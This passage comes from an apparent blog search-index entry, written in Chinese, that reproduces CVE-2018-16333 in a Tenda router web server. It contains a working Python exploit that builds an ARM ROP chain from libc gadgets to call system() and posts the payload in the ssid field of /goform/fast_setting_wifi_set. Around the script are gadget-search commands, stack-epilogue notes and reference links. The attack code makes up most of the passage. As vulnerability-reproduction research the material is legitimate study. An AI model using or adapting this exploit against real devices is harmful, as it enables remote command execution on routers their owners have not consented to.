class="hljs-string">&quot;HOME&quot;</span><br>mov_r0_ret_r3 = libc_base + 0x47738 # mov r0 , sp; blx r3<br>pop_r3 = libc_base + 0x18298 # pop r3<br><br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;system: &quot;</span> + hex(system))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;readable_addr: &quot;</span> + hex(readable_addr))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;mov_r0_ret_r3: &quot;</span> + hex(mov_r0_ret_r3))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;pop_r3: &quot;</span> + hex(pop_r3))<br><br><span class="hljs-comment">#payload不能存在\x00</span><br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*(0x60) + p32(readable_addr) + b<span class="hljs-string">&#x27;B&#x27;</span>*(0x20-8)<br>payload += p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd<br><br>url = <span class="hljs-string">&quot;http://192.168.32.101/goform/fast_setting_wifi_set&quot;</span><br>cookie = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;password=12345&quot;</span>&#125;<br>data = &#123;<span class="hljs-string">&quot;ssid&quot;</span>: payload&#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting!!&quot;</span>)<br><span class="hljs-comment"># 根据前人经验和多次调试发现，的确是需要2次访问才能触发漏洞，第一次不能触发form_fast_setting_wifi_set函数</span><br>response = requests.post(url, <span class="hljs-attribute">cookies</span>=cookie, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done1!!&quot;</span>)<br>response = requests.post(url, <span class="hljs-attribute">cookies</span>=cookie, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done2!!&quot;</span>)<br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><ul><li>根据gdb中的<code>vmmap</code>指令发现动态库是<code>./lib/libc.so.0</code>寻找Gadget</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ROPgadget --binary .<span class="hljs-regexp">/lib/</span>libc.so.<span class="hljs-number">0</span> --only <span class="hljs-string">&quot;pop&quot;</span>| <span class="hljs-keyword">grep</span> r3<br>ROPgadget --binary .<span class="hljs-regexp">/lib/</span>libc.so.<span class="hljs-number">0</span>  | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;mov r0, sp ; blx r3&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/20.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/21.png" alt="image"></p><ul><li>ROP</li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">form_fast_setting_wifi_set</span>的结尾处<br><span class="hljs-keyword">SUB</span> <span class="hljs-built_in">SP</span>, <span class="hljs-built_in">R11</span>, <span class="hljs-number">#0xC</span><br><span class="hljs-keyword">POP</span> &#123;<span class="hljs-built_in">R4</span>,<span class="hljs-built_in">R5</span>,<span class="hljs-built_in">R11</span>,<span class="hljs-built_in">PC</span>&#125;<br><br>等价于：<br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">SP</span>, <span class="hljs-built_in">R11</span><br><span class="hljs-keyword">POP</span> <span class="hljs-built_in">PC</span><br><span class="hljs-keyword">POP</span> <span class="hljs-built_in">R11</span><br><span class="hljs-keyword">POP</span> <span class="hljs-built_in">R5</span><br><span class="hljs-keyword">POP</span> <span class="hljs-built_in">R4</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/22.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/23.png" alt="image"></p><ul><li>运行结果</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/24.png" alt="image"></p><h2 id="0x6-疑惑"><a href="#0x6-疑惑" class="headerlink" title="0x6 疑惑"></a>0x6 疑惑</h2><ul><li>使用<code>httpd</code>中的<code>doSystemCmd</code>函数执行命令为什么不成功？</li><li>为什么第2次访问URL才能触发<code>form_fast_setting_wifi_set</code>函数？</li></ul><h2 id="0x7-Reference"><a href="#0x7-Reference" class="headerlink" title="0x7 Reference"></a>0x7 Reference</h2><ul><li><a href="https://www.anquanke.com/post/id/231445">https://www.anquanke.com/post/id/231445</a></li><li><a href="https://www.zmyth.me/Arm%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%B0%83%E7%94%A8%E6%A0%88%E5%9B%9E%E6%BA%AF/">https://www.zmyth.me/Arm%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%B0%83%E7%94%A8%E6%A0%88%E5%9B%9E%E6%BA%AF/</a></li><li><a href="https://cq674350529.github.io/2020/05/09/%E6%8A%80%E5%B7%A7misc/">https://cq674350529.github.io/2020/05/09/%E6%8A%80%E5%B7%A7misc/</a></li><li><a href="https://blog.csdn.net/richard1230/article/details/81159316">https://blog.csdn.net/richard1230/article/details/81159316</a></li><li><a href="https://xz.aliyun.com/t/7357">https://xz.aliyun.com/t/7357</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Router</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
